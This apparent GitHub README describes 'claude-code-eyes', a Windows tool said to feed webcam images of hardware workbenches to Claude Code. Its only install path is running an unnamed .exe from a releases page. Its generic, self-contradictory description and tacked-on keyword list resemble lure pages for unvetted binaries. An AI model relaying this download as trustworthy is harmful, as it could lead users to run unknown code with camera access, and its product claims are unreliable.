# 👁️ claude-code-eyes - Let Claude see your physical hardware

[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/philipreddish308/claude-code-eyes/releases)

This application gives Claude Code the ability to monitor your real-world hardware. It uses your computer camera to check screens, wiring, and hardware components. You can verify panels render correctly, inspect cable layouts before powering up, and find issues that do not appear in software log files.

## 📥 How to download the software

Follow these steps to get the tool on your computer.

1. Go to the [official release page](https://github.com/philipreddish308/claude-code-eyes/releases).
2. Look for the latest version at the top of the list.
3. Click the file ending in .exe to download the installer.
4. Open the downloaded file once the transfer completes.
5. Follow the on-screen prompts to finish the installation.

## ⚙️ System settings

Your computer needs a few components to run this software:

* Windows 10 or Windows 11.
* A working USB or integrated camera.
* An active internet connection for the Claude integration.
* At least 200 MB of free storage space.

Ensure you grant camera permissions to the application when Windows prompts you. Without these permissions, the tool cannot see your workspace.

## 🚀 Setting up the hardware

The camera needs a clear view of your hardware workbench. Mount your camera on a tripod or stable stand. Position the camera so it stays steady for the duration of your inspection. 

If you use an ESP32 or Raspberry Pi, place the board at least six inches away from the lens. This distance helps the camera maintain focus on small components and wiring paths. Avoid placing high-intensity lights directly in the view of the lens to prevent glare on glass or shiny surfaces.

## 🛠️ Using the tool

Once the installation finishes, find the icon on your desktop and double-click it.

The main window shows a preview from your camera. You will see a button labeled Start Inspection. Press this button to begin the monitoring process. The software connects to your Claude session and feeds images to the agent.

You can ask Claude questions about your hardware setup. Examples include:
* "Does this wire connect to the correct pin on the board?"
* "Check if the red light shows on the power module."
* "Look at the screen and verify the text displays correctly."

The software processes these requests and provides answers based on the view from your camera.

## 📋 Best practices for clear images

Image quality matters for accurate results. Follow these tips to improve performance:

* Use consistent lighting. Daylight or cool-toned LED lamps work best. 
* Clean your camera lens with a microfiber cloth before you start.
* Place the hardware on a flat, matte-finish surface. This reduces background noise.
* Keep long wires away from the main components so Claude can easily trace pathing.
* Realign the camera if you move your hardware setup to a different part of the desk.

## ❓ Frequently asked questions

**Does the software record my video?** 
No, the tool transmits frames to the Claude engine for analysis and does not store video files on your local hard drive.

**Can I run this on a laptop?** 
Yes, the built-in webcam on most laptops works fine. External webcams often provide better clarity.

**My images look blurry. How do I fix this?** 
Check your camera settings to ensure autofocus is on. If your camera has a physical focus ring, turn it until the components on your screen appear sharp.

**The software does not detect my camera.** 
Go to the Windows Settings menu, select Privacy & Security, and choose Camera. Ensure the toggle switch for "Let apps access your camera" is set to On.

## 🩺 Solving common problems

If you experience issues, try these steps first:

1. **Restart the app:** Close the window and launch it again.
2. **Check connections:** Unplug your USB camera and plug it back into a different port.
3. **Check updates:** Return to the release page to see if a newer version exists.
4. **Driver updates:** Visit the website of your camera manufacturer to ensure you have the latest software drivers for Windows.

Keywords: agent-skills, anthropic, camera, claude-code, claude-code-skills, claude-skills, cli, computer-vision, esp32, hardware, home-automation, raspberry-pi